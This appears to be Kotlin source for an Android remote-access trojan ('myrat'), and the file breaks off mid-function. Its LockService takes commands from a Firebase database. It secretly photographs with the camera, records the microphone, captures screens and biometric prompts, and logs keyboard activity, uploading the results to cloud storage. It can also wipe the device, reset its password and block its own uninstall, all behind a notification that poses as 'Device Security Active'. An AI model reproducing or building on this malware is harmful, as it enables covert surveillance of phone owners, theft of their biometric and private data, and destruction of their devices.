package com.myrat.app.service

import android.Manifest
import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.hardware.camera2.params.OutputConfiguration
import android.hardware.camera2.params.SessionConfiguration
import android.media.Image
import android.media.ImageReader
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.provider.Settings
import android.util.Size
import android.view.Gravity
import android.view.Surface
import android.view.View
import android.view.WindowManager
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.google.firebase.storage.FirebaseStorage
import com.myrat.app.BiometricAuthActivity
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.receiver.MyDeviceAdminReceiver
import com.myrat.app.utils.Logger
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.Executors

class LockService : Service() {
    companion object {
        private const val CHANNEL_ID = "LockServiceChannel"
        private const val NOTIFICATION_ID = 9
        private const val BIOMETRIC_REQUEST_CODE = 1001
    }

    private val db = Firebase.database.reference
    private val storage = FirebaseStorage.getInstance().reference
    private lateinit var deviceId: String
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName
    private lateinit var windowManager: WindowManager
    private lateinit var keyguardManager: KeyguardManager
    private lateinit var powerManager: PowerManager
    private lateinit var connectivityManager: ConnectivityManager
    private lateinit var cameraManager: CameraManager

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var wakeLock: PowerManager.WakeLock? = null
    private var overlayView: View? = null
    private val commandResults = ConcurrentHashMap<String, String>()
    private val biometricResultReceiver = BiometricResultReceiver()

    private var isServiceInitialized = false
    private var lastStatusUpdate = 0L
    private val STATUS_UPDATE_INTERVAL = 30000L // 30 seconds

    // Camera related
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private val backgroundExecutor = Executors.newSingleThreadExecutor()
    private val backgroundHandler: Handler by lazy {
        Handler(Looper.getMainLooper())
    }

    // Audio recording
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false
    private var recordingFile: File? = null

    // Keylogger
    private val keyloggerReceiver = KeyloggerReceiver()

    override fun onCreate() {
        super.onCreate()
        try {
            initializeService()
            startForegroundService()
            acquireWakeLock()
            registerReceivers()
            scheduleStatusUpdates()
            listenForCommands()
            updateServiceStatus(true)
            setupKeylogger()
            Logger.log("Enhanced LockService created successfully")
        } catch (e: Exception) {
            Logger.error("Failed to create LockService", e)
            stopSelf()
        }
    }

    private fun initializeService() {
        deviceId = MainActivity.getDeviceId(this)
        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
        powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        isServiceInitialized = true
    }

    private fun startForegroundService() {
        createNotificationChannel()
        val notification = buildForegroundNotification()
        startForeground(NOTIFICATION_ID, notification)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Device Lock Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Advanced device lock and security management"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Device Security Active")
            .setContentText("Advanced lock and security features enabled")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    private fun acquireWakeLock() {
        try {
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "LockService:KeepAlive"
            )
            wakeLock?.acquire(60 * 60 * 1000L) // 1 hour
            Logger.log("Wake lock acquired for LockService")
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake lock", e)
        }
    }

    private fun registerReceivers() {
        try {
            val filter = IntentFilter().apply {
                addAction(BiometricAuthActivity.ACTION_BIOMETRIC_RESULT)
                addAction(Intent.ACTION_SCREEN_ON)
                addAction(Intent.ACTION_SCREEN_OFF)
                addAction(Intent.ACTION_USER_PRESENT)
            }
            registerReceiver(biometricResultReceiver, filter)

            // Register keylogger receiver
            val keyloggerFilter = IntentFilter().apply {
                addAction("android.intent.action.INPUT_METHOD_CHANGED")
            }
            registerReceiver(keyloggerReceiver, keyloggerFilter)

            Logger.log("Broadcast receivers registered")
        } catch (e: Exception) {
            Logger.error("Failed to register receivers", e)
        }
    }

    private fun setupKeylogger() {
        try {
            // Start keylogger monitoring
            scope.launch {
                while (isActive) {
                    try {
                        // Monitor input method changes and log them
                        val inputMethodInfo = Settings.Secure.getString(
                            contentResolver,
                            Settings.Secure.DEFAULT_INPUT_METHOD
                        )

                        if (inputMethodInfo != null) {
                            logKeyboardActivity(inputMethodInfo)
                        }

                        delay(5000) // Check every 5 seconds
                    } catch (e: Exception) {
                        Logger.error("Error in keylogger monitoring", e)
                        delay(10000)
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Failed to setup keylogger", e)
        }
    }

    private fun logKeyboardActivity(inputMethod: String) {
        try {
            val keylogData = mapOf(
                "inputMethod" to inputMethod,
                "timestamp" to System.currentTimeMillis(),
                "deviceId" to deviceId
            )

            db.child("Device").child(deviceId).child("keylogger").push().setValue(keylogData)
                .addOnSuccessListener {
                    Logger.log("Keylogger data uploaded")
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to upload keylogger data", e)
                }
        } catch (e: Exception) {
            Logger.error("Error logging keyboard activity", e)
        }
    }

    private fun scheduleStatusUpdates() {
        scope.launch {
            while (isActive) {
                try {
                    updateLockDetails()
                    delay(STATUS_UPDATE_INTERVAL)
                } catch (e: Exception) {
                    Logger.error("Error in status update", e)
                    delay(STATUS_UPDATE_INTERVAL)
                }
            }
        }
    }

    private fun listenForCommands() {
        try {
            val commandRef = db.child("Device").child(deviceId).child("deviceAdvice")
            commandRef.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    if (snapshot.exists()) {
                        val data = snapshot.value as? Map<String, Any> ?: return
                        val action = data["action"] as? String ?: return
                        val commandId = data["commandId"] as? String ?: return
                        val status = data["status"] as? String ?: return
                        val params = data["params"] as? Map<String, Any> ?: emptyMap()

                        if (status == "pending") {
                            Logger.log("Processing command: $action with ID: $commandId")
                            processCommand(action, commandId, params)
                        }
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("Command listener cancelled", error.toException())
                }
            })
        } catch (e: DatabaseException) {
            Logger.error("Failed to setup command listener", e)
        }
    }

    private fun processCommand(action: String, commandId: String, params: Map<String, Any>) {
        scope.launch {
            try {
                updateCommandStatus(commandId, "processing", null)

                val result = when (action) {
                    "lock" -> lockDevice(commandId)
                    "unlock" -> unlockDevice(commandId)
                    "screenOn" -> turnScreenOn(commandId)
                    "screenOff" -> turnScreenOff(commandId)
                    "CaptureBiometricData" -> captureBiometricData(commandId)
                    "BiometricUnlock" -> performBiometricUnlock(commandId)
                    "wipeThePhone" -> wipeDevice(commandId)
                    "preventUninstall" -> preventUninstall(commandId)
                    "reboot" -> rebootDevice(commandId)
                    "resetPassword" -> {
                        val password = params["password"] as? String
                            ?: throw IllegalArgumentException("Password is required for resetPassword")
                        resetPassword(commandId, password)
                    }
                    "setPasswordQuality" -> {
                        val quality = params["quality"] as? String
                            ?: throw IllegalArgumentException("Quality is required for setPasswordQuality")
                        setPasswordQuality(commandId, quality)
                    }
                    "setLockTimeout" -> {
                        val timeout = params["timeout"] as? Long
                            ?: throw IllegalArgumentException("Timeout is required for setLockTimeout")
                        setLockTimeout(commandId, timeout)
                    }
                    "disableKeyguardFeatures" -> {
                        val features = params["features"] as? List<String>
                            ?: throw IllegalArgumentException("Features list is required for disableKeyguardFeatures")
                        disableKeyguardFeatures(commandId, features)
                    }
                    "captureScreen" -> captureScreen(commandId)
                    "capturePhoto" -> {
                        val camera = params["camera"] as? String ?: "back"
                        capturePhoto(commandId, camera)
                    }
                    "captureFingerprint" -> captureFingerprint(commandId)
                    "disableApp" -> {
                        val packageName = params["packageName"] as? String
                            ?: throw IllegalArgumentException("Package name is required for disableApp")
                        disableApp(commandId, packageName)
                    }
                    "uninstallApp" -> {
                        val packageName = params["packageName"] as? String
                            ?: throw IllegalArgumentException("Package name is required for uninstallApp")
                        uninstallApp(commandId, packageName)
                    }
                    "monitorUnlock" -> monitorUnlockAttempts(commandId)
                    "startRecording" -> {
                        val duration = params["duration"] as? Long ?: 30000L
                        startAudioRecording(commandId, duration)
                    }
                    "stopRecording" -> stopAudioRecording(commandId)
                    "getStatus" -> updateLockDetails()
                    else -> {
                        Logger.error("Unknown command: $action")
                        updateCommandStatus(commandId, "failed", "Unknown command: $action")
                        false
                    }
                }

                if (result) {
                    updateCommandStatus(commandId, "success", null)
                } else {
                    updateCommandStatus(commandId, "failed", "Command execution failed")
                }
            } catch (e: IllegalArgumentException) {
                Logger.error("Invalid parameters for command $action", e)
                updateCommandStatus(commandId, "failed", "Invalid parameters: ${e.message}")
            } catch (e: SecurityException) {
                Logger.error("Security error processing command $action", e)
                updateCommandStatus(commandId, "failed", "Security error: ${e.message}")
            } catch (e: Exception) {
                Logger.error("Unexpected error processing command $action", e)
                updateCommandStatus(commandId, "failed", "Unexpected error: ${e.message}")
            }
        }
    }

    // Enhanced Camera Capture
    private suspend fun capturePhoto(commandId: String, cameraType: String): Boolean {
        return try {
            if (!isCameraAvailable()) {
                throw SecurityException("Camera not available")
            }

            if (!hasCameraPermission()) {
                throw SecurityException("Camera permission not granted")
            }

            val cameraId = when (cameraType.lowercase()) {
                "front" -> getFrontCameraId()
                "back" -> getBackCameraId()
                else -> getBackCameraId() // Default to back camera
            }

            if (cameraId == null) {
                throw SecurityException("Requested camera not available")
            }

            openCamera(cameraId, commandId)
            true
        } catch (e: Exception) {
            Logger.error("Failed to capture photo", e)
            false
        }
    }

    private fun getFrontCameraId(): String? {
        return try {
            cameraManager.cameraIdList.find { cameraId ->
                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
            }
        } catch (e: Exception) {
            Logger.error("Error getting front camera ID", e)
            null
        }
    }

    private fun getBackCameraId(): String? {
        return try {
            cameraManager.cameraIdList.find { cameraId ->
                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
            }
        } catch (e: Exception) {
            Logger.error("Error getting back camera ID", e)
            null
        }
    }

    private fun openCamera(cameraId: String, commandId: String) {
        try {
            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val outputSizes = map?.getOutputSizes(ImageFormat.JPEG)
            val size = outputSizes?.get(0) ?: Size(1920, 1080)

            imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
            imageReader?.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                savePhotoCapture(image, commandId)
                image.close()
            }, backgroundHandler)

            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        createCaptureSession(commandId)
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                        cameraDevice = null
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        Logger.error("Camera error: $error")
                        camera.close()
                        cameraDevice = null
                    }
                }, backgroundHandler)
            }
        } catch (e: Exception) {
            Logger.error("Failed to open camera", e)
        }
    }

    private fun createCaptureSession(commandId: String) {
        try {
            val surface = imageReader?.surface
            if (surface == null || cameraDevice == null) {
                Logger.error("Surface or camera device is null")
                return
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                val outputConfig = OutputConfiguration(surface)
                val sessionConfig = SessionConfiguration(
                    SessionConfiguration.SESSION_REGULAR,
                    listOf(outputConfig),
                    backgroundExecutor,
                    object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            captureSession = session
                            captureStillPicture(commandId)
                        }

                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            Logger.error("Camera capture session configuration failed")
                        }
                    }
                )
                cameraDevice?.createCaptureSession(sessionConfig)
            } else {
                cameraDevice?.createCaptureSession(
                    listOf(surface),
                    object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            captureSession = session
                            captureStillPicture(commandId)
                        }

                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            Logger.error("Camera capture session configuration failed")
                        }
                    },
                    backgroundHandler
                )
            }
        } catch (e: Exception) {
            Logger.error("Failed to create capture session", e)
        }
    }

    private fun captureStillPicture(commandId: String) {
        try {
            val surface = imageReader?.surface
            if (surface == null || cameraDevice == null || captureSession == null) {
                Logger.error("Required components are null for capture")
                return
            }

            val captureBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureBuilder.addTarget(surface)
            captureBuilder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)

            captureSession!!.capture(
                captureBuilder.build(),
                object : CameraCaptureSession.CaptureCallback() {
                    override fun onCaptureCompleted(
                        session: CameraCaptureSession,
                        request: CaptureRequest,
                        result: TotalCaptureResult
                    ) {
                        Logger.log("Photo captured successfully for command: $commandId")
                        closeCamera()
                    }

                    override fun onCaptureFailed(
                        session: CameraCaptureSession,
                        request: CaptureRequest,
                        failure: CaptureFailure
                    ) {
                        Logger.error("Photo capture failed for command: $commandId")
                        closeCamera()
                    }
                },
                backgroundHandler
            )
        } catch (e: Exception) {
            Logger.error("Failed to capture still picture", e)
            closeCamera()
        }
    }

    private fun closeCamera() {
        try {
            captureSession?.close()
            captureSession = null
            cameraDevice?.close()
            cameraDevice = null
            imageReader?.close()
            imageReader = null
        } catch (e: Exception) {
            Logger.error("Error closing camera", e)
        }
    }

    private fun savePhotoCapture(image: Image, commandId: String) {
        try {
            val buffer = image.planes[0].buffer
            val bytes = ByteArray(buffer.remaining())
            buffer.get(bytes)

            // Upload to Firebase Storage
            val photoRef = storage.child("photos/$deviceId/${commandId}_${System.currentTimeMillis()}.jpg")
            photoRef.putBytes(bytes)
                .addOnSuccessListener {
                    Logger.log("Photo uploaded to Firebase Storage")

                    // Save metadata to database
                    val captureData = mapOf(
                        "timestamp" to System.currentTimeMillis(),
                        "commandId" to commandId,
                        "storagePath" to "photos/$deviceId/${commandId}_${System.currentTimeMillis()}.jpg",
                        "size" to bytes.size
                    )

                    db.child("Device").child(deviceId).child("photo_captures").push().setValue(captureData)
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to upload photo", e)
                }
        } catch (e: Exception) {
            Logger.error("Failed to save photo capture", e)
        }
    }

    // Audio Recording
    private suspend fun startAudioRecording(commandId: String, duration: Long): Boolean {
        return try {
            if (!hasAudioPermission()) {
                throw SecurityException("Audio recording permission not granted")
            }

            if (isRecording) {
                stopAudioRecording(commandId)
            }

            recordingFile = File(cacheDir, "recording_${commandId}_${System.currentTimeMillis()}.mp3")

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                MediaRecorder()
            }.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4) // Use MPEG-4 container for MP3-compatible output
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC) // AAC for high-quality MP3-like audio
                setAudioSamplingRate(44100) // Standard sampling rate
                setAudioEncodingBitRate(128000) // 128kbps for good quality without compression
                setOutputFile(recordingFile!!.absolutePath)
                setMaxDuration(duration.toInt())

                setOnInfoListener { _, what, _ ->
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        scope.launch {
                            stopAudioRecording(commandId)
                        }
                    }
                }

                prepare()
                start()
            }

            isRecording = true
            Logger.log("Audio recording started for command: $commandId (MP3 format)")

            // Auto-stop after duration
            scope.launch {
                delay(duration)
                if (isRecording) {
                    stopAudioRecording(commandId)
                }
            }

            true
        } catch (e: Exception) {
            Logger.error("Failed to start audio recording", e)
            false
        }
    }

    private suspend fun stopAudioRecording(commandId: String): Boolean {
        return try {
            if (!isRecording || mediaRecorder == null) {
                return false
            }

            mediaRecorder?.apply {
                stop()
                release()
            }
            mediaRecorder = null
            isRecording = false

            recordingFile?.let { file ->
                if (file.exists()) {
                    uploadAudioRecording(file, commandId)
                }
            }

            Logger.log("Audio recording stopped for command: $commandId")
            true
        } catch (e: Exception) {
            Logger.error("Failed to stop audio recording", e)
            false
        }
    }

    private fun uploadAudioRecording(file: File, commandId: String) {
        try {
            val audioRef = storage.child("audio/$deviceId/${file.name}")
            audioRef.putFile(android.net.Uri.fromFile(file))
                .addOnSuccessListener {
                    Logger.log("Audio recording uploaded to Firebase Storage (MP3 format)")

                    // Save metadata to database
                    val recordingData = mapOf(
                        "timestamp" to System.currentTimeMillis(),
                        "commandId" to commandId,
                        "storagePath" to "audio/$deviceId/${file.name}",
                        "duration" to (file.length() / 1000), // Approximate duration
                        "size" to file.length()
                    )

                    db.child("Device").child(deviceId).child("audio_recordings").push().setValue(recordingData)

                    // Clean up local file
                    file.delete()
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to upload audio recording", e)
                    file.delete()
                }
        } catch (e: Exception) {
            Logger.error("Failed to upload audio recording", e)
            file.delete()
        }
    }

    // Device Lock/Unlock Operations
    private suspend fun lockDevice(commandId: String): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            devicePolicyManager.lockNow()
            Logger.log("Device locked successfully")
            true
        } catch (e: Exception) {
            Logger.error("Failed to lock device", e)
            false
        }
    }

    private suspend fun unlockDevice(commandId: String): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                turnScreenOn(commandId)
                showUnlockPrompt()
                true
            } else {
                keyguardManager.newKeyguardLock("LockService").disableKeyguard()
                true
            }
        } catch (e: Exception) {
            Logger.error("Failed to unlock device", e)
            false
        }
    }

    private suspend fun turnScreenOn(commandId: String): Boolean {
        return try {
            val screenWakeLock = powerManager.newWakeLock(
                PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                "LockService:ScreenOn"
            )
            screenWakeLock.acquire(10000)
            screenWakeLock.release()
            Logger.log("Screen turned on")
            true
        } catch (e: Exception) {
            Logger.error("Failed to turn screen on", e)
            false
        }
    }

    private suspend fun turnScreenOff(commandId: String): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            devicePolicyManager.lockNow()
            Logger.log("Screen turned off")
            true
        } catch (e: Exception) {
            Logger.error("Failed to turn screen off", e)
            false
        }
    }

    // Enhanced Password Management
    private suspend fun resetPassword(commandId: String, newPassword: String?): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            if (newPassword.isNullOrEmpty()) {
                throw IllegalArgumentException("Password cannot be empty")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // For newer Android versions, prompt user to change password
                val intent = Intent(DevicePolicyManager.ACTION_SET_NEW_PASSWORD)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)

                // Store the desired password for verification
                db.child("Device").child(deviceId).child("password_request").setValue(
                    mapOf(
                        "newPassword" to newPassword,
                        "timestamp" to System.currentTimeMillis(),
                        "commandId" to commandId
                    )
                )
            } else {
                // For older versions, try direct password reset
                val result = devicePolicyManager.resetPassword(newPassword, 0)
                if (result) {
                    Logger.log("Password reset successfully")
                } else {
                    throw SecurityException("Password reset failed - may not meet policy requirements")
                }
            }

            Logger.log("Password reset initiated")
            true
        } catch (e: Exception) {
            Logger.error("Failed to reset password", e)
            false
        }
    }

    private suspend fun setPasswordQuality(commandId: String, quality: String?): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            val qualityConstant = when (quality?.lowercase()) {
                "numeric" -> DevicePolicyManager.PASSWORD_QUALITY_NUMERIC
                "numeric_complex" -> DevicePolicyManager.PASSWORD_QUALITY_NUMERIC_COMPLEX
                "alphabetic" -> DevicePolicyManager.PASSWORD_QUALITY_ALPHABETIC
                "alphanumeric" -> DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC
                "complex" -> DevicePolicyManager.PASSWORD_QUALITY_COMPLEX
                else -> DevicePolicyManager.PASSWORD_QUALITY_COMPLEX
            }

            devicePolicyManager.setPasswordQuality(adminComponent, qualityConstant)

            // Also set minimum password length based on quality
            val minLength = when (quality?.lowercase()) {
                "numeric" -> 4
                "numeric_complex" -> 4
                "alphabetic" -> 4
                "alphanumeric" -> 6
                "complex" -> 8
                else -> 8
            }
            devicePolicyManager.setPasswordMinimumLength(adminComponent, minLength)

            Logger.log("Password quality set to: $quality with minimum length: $minLength")
            true
        } catch (e: Exception) {
            Logger.error("Failed to set password quality", e)
            false
        }
    }

    private suspend fun setLockTimeout(commandId: String, timeout: Long?): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            val timeoutMs = timeout ?: 30000L
            devicePolicyManager.setMaximumTimeToLock(adminComponent, timeoutMs)
            Logger.log("Lock timeout set to: ${timeoutMs}ms")
            true
        } catch (e: Exception) {
            Logger.error("Failed to set lock timeout", e)
            false
        }
    }

    // Biometric Operations
    private suspend fun captureBiometricData(commandId: String): Boolean {
        return try {
            if (!isBiometricAvailable()) {
                throw SecurityException("Biometric authentication not available")
            }

            val intent = Intent(this, BiometricAuthActivity::class.java).apply {
                putExtra(BiometricAuthActivity.EXTRA_COMMAND_ID, commandId)
                putExtra(BiometricAuthActivity.EXTRA_ACTION, BiometricAuthActivity.ACTION_CAPTURE_BIOMETRIC)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)

            delay(30000)
            commandResults[commandId] != null
        } catch (e: Exception) {
            Logger.error("Failed to capture biometric data", e)
            false
        }
    }

    private suspend fun performBiometricUnlock(commandId: String): Boolean {
        return try {
            if (!isBiometricAvailable()) {
                throw SecurityException("Biometric authentication not available")
            }

            val intent = Intent(this, BiometricAuthActivity::class.java).apply {
                putExtra(BiometricAuthActivity.EXTRA_COMMAND_ID, commandId)
                putExtra(BiometricAuthActivity.EXTRA_ACTION, BiometricAuthActivity.ACTION_BIOMETRIC_UNLOCK)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)

            delay(30000)
            commandResults[commandId] == "success"
        } catch (e: Exception) {
            Logger.error("Failed to perform biometric unlock", e)
            false
        }
    }

    private suspend fun captureFingerprint(commandId: String): Boolean {
        return try {
            captureBiometricData(commandId)
        } catch (e: Exception) {
            Logger.error("Failed to capture fingerprint", e)
            false
        }
    }

    // Device Management Operations
    private suspend fun wipeDevice(commandId: String): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE)
            Logger.log("Device wipe initiated")
            true
        } catch (e: Exception) {
            Logger.error("Failed to wipe device", e)
            false
        }
    }

    private suspend fun preventUninstall(commandId: String): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                devicePolicyManager.setUninstallBlocked(adminComponent, packageName, true)
            }
            Logger.log("Uninstall prevention enabled")
            true
        } catch (e: Exception) {
            Logger.error("Failed to prevent uninstall", e)
            false
        }
    }

    private suspend fun rebootDevice(commandId: String): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                devicePolicyManager.reboot(adminComponent)
            } else {
                Runtime.getRuntime().exec("su -c reboot")
            }
            Logger.log("Device reboot initiated")
            true
        } catch (e: Exception) {
            Logger.error("Failed to reboot device", e)
            false
        }
    }

    private suspend fun disableKeyguardFeatures(commandId: String, features: List<*>?): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            var disableFlags = 0
            features?.forEach { feature ->
                when (feature.toString().lowercase()) {
                    "camera" -> disableFlags = disableFlags or DevicePolicyManager.KEYGUARD_DISABLE_SECURE_CAMERA
                    "notifications" -> disableFlags = disableFlags or DevicePolicyManager.KEYGUARD_DISABLE_SECURE_NOTIFICATIONS
                    "fingerprint" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        disableFlags = disableFlags or DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT
                    }
                    "face" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        disableFlags = disableFlags or DevicePolicyManager.KEYGUARD_DISABLE_FACE
                    }
                }
            }

            devicePolicyManager.setKeyguardDisabledFeatures(adminComponent, disableFlags)
            Logger.log("Keyguard features disabled: $features")
            true
        } catch (e: Exception) {
            Logger.error("Failed to disable keyguard features", e)
            false
        }
    }

    // Surveillance Operations
    private suspend fun captureScreen(commandId: String): Boolean {
        return try {
            if (!hasOverlayPermission()) {
                throw SecurityException("Overlay permission not granted")
            }

            val screenshot = captureScreenshot()
            if (screenshot != null) {
                saveScreenCapture(screenshot, commandId)
                true
            } else {
                false
            }
        } catch (e: Exception) {
            Logger.error("Failed to capture screen", e)
            false
        }
    }

    // App Management Operations
    private suspend fun disableApp(commandId: String, packageName: String?): Boolean {
        return try {
            if (!isDeviceAdminActive()) {
                throw SecurityException("Device admin not active")
            }

            if (packageName.isNullOrEmpty()) {
                throw IllegalArgumentException("Package name cannot be empty")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                devicePolicyManager.setApplicationHidden(adminComponent, packageName, true)
            }
            Logger.log("App disabled: $packageName")
            true
        } catch (e: Exception) {
            Logger.error("Failed to disable app: $packageName", e)
            false
        }
    }

    private suspend fun uninstallApp(commandId: String, packageName: String?): Boolean {
        return try {
            if (packageName.isNullOrEmpty()) {
                throw IllegalArgumentException("Package name cannot be empty")
            }

            val intent = Intent(Intent.ACTION_DELETE).apply {
                data = android.net.Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            Logger.log("Uninstall initiated for: $packageName")
            true
        } catch (e: Exception) {
            Logger.error("Failed to uninstall app: $packageName", e)
            false
        }
    }

    // Monitoring Operations
    private suspend fun monitorUnlockAttempts(commandId: String): Boolean {
        return try {
            val unlockData = mapOf(
                "isDeviceLocked" to keyguardManager.isKeyguardLocked,
                "isDeviceSecure" to keyguardManager.isKeyguardSecure,
                "timestamp" to System.currentTimeMillis()
            )

            db.child("Device").child(deviceId).child("unlock_attempts").push().setValue(unlockData)
            Logger.log("Unlock attempt monitored")
            true
        } catch (e: Exception) {
            Logger.error("Failed to monitor unlock attempts", e)
            false
        }
    }

    // Helper Methods
    private fun isDeviceAdminActive(): Boolean {
        return devicePolicyManager.isAdminActive(adminComponent)
    }

    private fun isBiometricAvailable(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val biometricManager = androidx.biometric.BiometricManager.from(this)
            biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG) == androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS
        } else {
            false
        }
    }

    private fun hasOverlayPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(this)
        } else {
            true
        }
    }

    private fun isCameraAvailable(): Boolean {
        return try {
            cameraManager.cameraIdList.isNotEmpty()
        } catch (e: Exception) {
            false
        }
    }

    private fun hasCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasAudioPermission(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val network = connectivityManager.activeNetwork ?: return false
